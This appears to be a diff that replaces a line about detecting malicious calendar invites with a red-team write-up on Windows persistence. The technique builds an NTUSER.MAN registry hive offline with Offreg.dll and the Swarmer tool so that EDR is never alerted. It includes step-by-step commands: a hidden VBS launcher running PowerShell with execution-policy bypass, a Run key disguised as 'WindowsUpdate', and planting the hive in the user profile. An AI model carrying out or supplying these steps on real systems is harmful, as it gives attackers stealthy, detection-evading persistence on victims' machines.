@@ -1,1 +1,57 @@
-Also, building detections for these events is particularly challenging — the content inside the .ics file, including embedded URLs and phone numbers, is not surfaced in the O365 audit logs, making it impossible to inspect what was written into the calendar entry without additional tooling.
+Introduction
+
+- Most attackers writing persistence call RegSetValue directly into 
+  the registry Run key — and every modern EDR fires an alert the 
+  moment that happens.
+
+In this technique:
+
+  - The live registry on the target is never touched
+  - A registry hive file is built offline using Offreg.dll — a 
+    legitimate Windows library most security tools do not monitor
+  - The persistence entry is embedded into the file before it 
+    reaches the target
+  - Once placed in the user's profile directory, Windows loads 
+    it automatically at the next login
+  - The startup entry fires as part of the normal boot sequence — 
+    no registry API calls, no EDR hooks triggered
+
+HiveBuilder.cs:
+HiveBuilder employs a sequence of five steps to build NTUSER.MAN entirely offline, without any interaction with the live registry.
+
+Step one: The function RegLoadAppKeyW is used to create a blank, well-formed hive file on disk, utilizing a standard Windows API from the advapi32.dll library. The need to create a hive file from scratch arises because Offreg.dll cannot create a valid hive from an empty state.
+
+Step two: The OROpenHive function opens the initialized skeleton file as an editable hive object in memory, utilizing the Offline Registry Library (offreg.dll).
+
+Step three: The ImportRegFile() function reads the text file hive_export.reg line by line, where each line of text represents a registry entry to be imported into the hive. The function ORCreateKey and ORSetValue are used to replay each of the lines from the text file into the hive, which effectively builds a hive with the complete structure of the user profile.
+
+Step four: The ORCreateKey function navigates to the location SOFTWARE\Microsoft\Windows\CurrentVersion\Run in the hive, where the persistence entry will be written, utilizing Offreg.
+
+Step five: The ORSaveHive function serializes the completed hive object in memory, which includes the complete profile structure, along with the persistence entry, into a file named NTUSER.MAN, formatted for Windows 10, ready to be placed into the user’s profile directory.
+
+Execution Plan :
+
+1. Download Swarmer from https://github.com/praetorian-inc/swarmer
+
+2. Compile using: dotnet build -c Release
+
+3. Create the silent payload launcher
+   Set-Content "C:\ProgramData\launcher.vbs" -Encoding ASCII -Value 'Set WshShell = CreateObject("WScript.Shell"): WshShell.Run "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\payload.ps1", 0, False'
+
+4. Export the full HKCU registry hive
+   reg export HKCU C:\Users\Public\hive_export.reg /y
+
+5. Generate NTUSER.MAN using Swarmer
+   swarmer.exe --startup-key "WindowsUpdate" --startup-value "wscript.exe C:\ProgramData\launcher.vbs" C:\Users\Public\hive_export.reg NTUSER.MAN
+
+6. Copy NTUSER.MAN to user profile
+   Copy-Item ".\NTUSER.MAN" "$env:USERPROFILE\NTUSER.MAN" -Force
+
+7. Log off and log back in
+
+8. Confirm persistence fired
+   Get-Content "C:\ProgramData\persistence_log.txt"
+
+
+
+
